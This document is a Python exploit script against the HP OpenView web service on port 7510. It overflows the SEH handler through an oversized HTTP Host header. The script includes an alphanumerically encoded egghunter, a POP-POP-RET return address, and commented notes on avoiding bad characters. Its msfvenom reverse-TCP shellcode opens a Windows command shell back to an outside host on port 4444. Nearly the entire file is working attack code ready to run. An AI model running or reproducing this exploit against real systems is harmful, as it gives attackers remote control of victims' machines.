#!/usr/bin/env python 

import socket 
import os 
import sys 

IP = sys.argv[1]

# we need POP POP RETN to get back to our shellcode, buffer will overwrite SEH
# and our shellcode will be on 3rd position on stack
# we can use Windows tool findjump2.exe to fin it:  findjump2.exe ov.dll ebx
# 0x5A02EF74      pop ebx - pop - retbis

# previous address has bad chars so we need to search for another 
# after a lot of search and discovery of a lot of new bad chards, this one looks good: 
# C:\Program Files\HP OpenView\bin>findjump2.exe jvm.dll ebx | findstr 4624
# 0x6D354624      pop ebx - pop - ret

# address give my tool is not correct, correct addres is: 
# 6D35462B   5E               POP ESI

# when we hit our buffer we need short JMP to our shellcode over some instructions
# since short JMP is not in allowed char. list, we need cond JMP
# in order to fullfil cond. we need to dec. ESP twice: 
# 4C 	DEC ESP 
# 4C 	DEC ESP 
# 77 21 JA SHORT 

egghunter=(
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x54\x58"
# first part of egghunter zeros EAX (AND EAX,554E4D4A + AND EAX,2A313235), then
# PUSH ESP to stack and POPs it back to EAX, so we have ESP addr. in EAX:
# 25 4A 4D 4E 55 25 35 32 31 2A 54 58
"\x2d\x66\x4d\x55\x55"
"\x2d\x66\x4b\x55\x55"
"\x2d\x6a\x50\x55\x55"
"\x50"
"\x5c"
# after that, we subtract some bytes in EAX so that it points to address
# where execution will bring us (estimated) so it's good place to put our egghunter there
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
# we will zero EAX again
"\x2d\x21\x55\x55\x55"
"\x2d\x21\x54\x55\x55"
"\x2d\x49\x6f\x55\x6d"
# subtract 1800188B from 0 in order to get our last 4 bytes of egghunter (0 - 55555521 - 55555421 - 6D556F49 = E7FFE775; 1800188B = 55555521 + 55555421 + 6D556F49), all characters must me in allowed set of characters
"\x50"
# and push E7FFE775 to stack as our last 4 bytes of egghunter, then will proceed with next 4 bytes from end to the beggining 
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
# zeroing EAX 
"\x2d\x71\x21\x61\x75"
"\x2d\x71\x21\x61\x75"
"\x2d\x6f\x47\x53\x65"
# getting next 4 bytes from end towards start 
"\x50"
# pushing those bytes to stack 
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x2d\x44\x41\x7e\x58"
"\x2d\x44\x34\x7e\x58"
"\x2d\x48\x33\x78\x54"
"\x50"
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x2d\x71\x7a\x31\x45"
"\x2d\x31\x7a\x31\x45"
"\x2d\x6f\x52\x48\x45"
"\x50"
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x2d\x33\x73\x31\x2d"
"\x2d\x33\x33\x31\x2d"
"\x2d\x5e\x54\x43\x31"
"\x50"
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x2d\x45\x31\x77\x45"
"\x2d\x45\x31\x47\x45"
"\x2d\x74\x45\x74\x46"
"\x50"
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x2d\x52\x32\x32\x32"
"\x2d\x31\x31\x31\x31"
"\x2d\x6e\x5a\x4a\x32"
"\x50"
"\x25\x4a\x4d\x4e\x55"
"\x25\x35\x32\x31\x2a"
"\x2d\x31\x2d\x77\x44"
"\x2d\x31\x2d\x77\x44"
"\x2d\x38\x24\x47\x77"
"\x50")

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.26 LPORT=4444 -f python
# Payload size: 324 bytes

buf =  ""
buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
buf += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
buf += "\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
buf += "\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x64\x1a\x68"
buf += "\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
buf += "\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
buf += "\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
buf += "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
buf += "\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
buf += "\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
buf += "\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
buf += "\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
buf += "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"


crash = "A" * 3377 + "\x4c\x4c\x77\x21" + "\x2b\x46\x35\x6d" + "C" * 29
crash += egghunter + "B" * (360 - (len(egghunter))) + ":7510"

evilcode = "GET /topology/homeBaseView HTTP/1.1\r\n"
evilcode += "Host: " + crash + "\r\n"
evilcode += "Content-Type: application/x-www-form-urlencoded\r\n"
evilcode += "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
evilcode += "Content-Lenght: 1048580\r\n\r\n"
evilcode += ("T00WT00W" + "C" * 64 + buf + "\xCC" * (1234-len(buf))) # New buffer space we need for our finall shellcode, this space does not contain bad chars like our previous buffer and does not alter memory or causes problem with program execution
# New buffer space will end-up somewhere in memory and won't be accessible with any of regusters so we need egghunter to search for T00WT00W in the beggining of it

print ("Sending evil HTTP request made by Ivan")

packet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
packet.connect((IP,7510))
packet.send(evilcode)
packet.close()

print ("All done!")
